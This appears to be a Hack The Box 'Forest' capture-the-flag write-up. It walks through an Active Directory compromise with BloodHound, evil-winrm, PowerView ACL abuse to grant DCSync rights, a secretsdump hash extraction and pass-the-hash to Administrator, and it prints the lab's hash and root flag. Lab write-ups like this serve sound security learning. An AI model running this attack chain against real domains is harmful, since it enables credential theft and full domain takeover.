# BloodHound

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.2.15  htb.local/svc-alfresco:s3rvice
sudo bloodhound-ce-python -d htb.local -dc forest.htb.local -ns 10.129.2.15 -u 'svc-alfresco' -p 's3rvice' -c all
```

BloodHound shows that `svc-alfresco` is a member of the "ACCOUNT OPERATORS" group, which has "GenericAll" permissions on the "EXCHANGE WINDOWS PERMISSIONS" group, which in return has "WriteDacl" permissions on the domain:
![[Pasted image 20251203145121.png]]

According to the official documentation:
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators
the group "ACCOUNT OPERATORS" has permission to create AD users.

# Create new user for  group "EXCHANGE WINDOWS PERMISSIONS"

Login via evil-winrm:
```bash
evil-winrm -i 10.129.2.15 -u 'svc-alfresco' -p 's3rvice'
```

Create new user john and add to group:
```powershell
# Create new AD user john
net user john abc123! /add /domain

# Add john to the group "Exchange Windows Permissions"
net group "Exchange Windows Permissions" john /add
```

Upload PowerView.ps1
```
upload PowerView.ps1
. .\PowerView.ps1
```

Add DCSync privs to john:
```powershell
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb.local\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

Run DCSync attack:
```bash
impacket-secretsdump htb/john@10.129.2.15

# ...
# htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
# ...
```

# Evil-winrm as Administrator

```bash
evil-winrm -i 10.129.2.15 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

Root flag:
```powershell
cat C:\Users\Administrator\Desktop\root.txt
f7e3ffcba3ee18a86ec001b7a99542f4
```